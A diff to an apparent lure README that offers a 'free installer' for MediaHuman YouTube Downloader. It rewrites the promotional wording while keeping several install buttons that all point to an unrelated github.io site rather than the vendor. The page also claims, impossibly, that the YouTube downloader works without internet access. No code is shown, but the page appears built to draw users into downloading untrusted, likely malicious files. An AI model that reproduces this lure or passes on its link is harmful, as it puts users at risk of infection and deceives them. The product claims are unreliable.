@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Video+Downloader-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 MediaHuman YouTube Downloader Free Installer** — MediaHuman YouTube Downloader is a free application for downloading videos and audio from YouTube, SoundCloud, and dozens of other platforms. Works without internet access, no account required. Full offline installation.
+**💻 MediaHuman YouTube Downloader Free Installer** — MediaHuman YouTube Downloader is a free video downloader for Windows, macOS, and Linux that downloads videos from YouTube, Vimeo, SoundCloud, and other platforms. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install MediaHuman YouTube Downloader](https://img.shields.io/badge/⬇_Install_MediaHuman%20YouTube%20Downloader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install MediaHuman YouTube Downloader](https://img.shields.io/badge/⬇_Install_MediaHuman+YouTube+Downloader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About MediaHuman YouTube Downloader
 
-MediaHuman YouTube Downloader is a free application for downloading videos and audio from YouTube, SoundCloud, and dozens of other platforms. It features a clean interface, batch download support, iTunes integration, and one-click audio extraction to MP3 or AAC.
+MediaHuman YouTube Downloader is a free video downloader for Windows, macOS, and Linux that downloads videos from YouTube, Vimeo, SoundCloud, and other platforms. Features batch downloading, quality selection, subtitle download, MP3 conversion, and iTunes integration for downloaded audio. The clean interface makes downloading individual videos or entire YouTube playlists straightforward.
 
 ---
 
 ## ❌ Problem: MediaHuman YouTube Downloader is hard to access
 
-- **Platform Restrictions** — Cannot download age-restricted or members-only content
-- **Regular Updates Required** — Platform changes frequently require application updates
-- **Limited Resolution** — Some platforms restrict maximum downloadable quality
-- **No Video Editing** — Cannot trim or process downloaded files within the application
+- **Legal Considerations** — Downloading copyrighted content may violate platform terms
+- **Platform Changes** — API changes can temporarily break download functionality
+- **Commercial Limitations** — Some features require paid Pro version
+- **Speed Caps** — Some platforms throttle bulk downloads
 
 ---
 
@@ -81,7 +81,7 @@ MediaHuman YouTube Downloader is a free application for downloading videos and a
 
 <div align="center">
 
-[![⬇ Install MediaHuman YouTube Downloader](https://img.shields.io/badge/⬇_Install_MediaHuman%20YouTube%20Downloader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install MediaHuman YouTube Downloader](https://img.shields.io/badge/⬇_Install_MediaHuman+YouTube+Downloader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ MediaHuman YouTube Downloader is a free application for downloading videos and a
 
 ---
 
-**MediaHuman YouTube Downloader Free Installer** — MediaHuman YouTube Downloader is a free application for downloading videos and audio from YouTube, SoundCloud, and dozens of other platforms. Install without internet connection today!
+**MediaHuman YouTube Downloader Free Installer** — MediaHuman YouTube Downloader is a free video downloader for Windows, macOS, and Linux that downloads videos from YouTube, Vimeo, SoundCloud, and other platforms. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install MediaHuman YouTube Downloader](https://img.shields.io/badge/⬇_Install_MediaHuman%20YouTube%20Downloader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install MediaHuman YouTube Downloader](https://img.shields.io/badge/⬇_Install_MediaHuman+YouTube+Downloader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
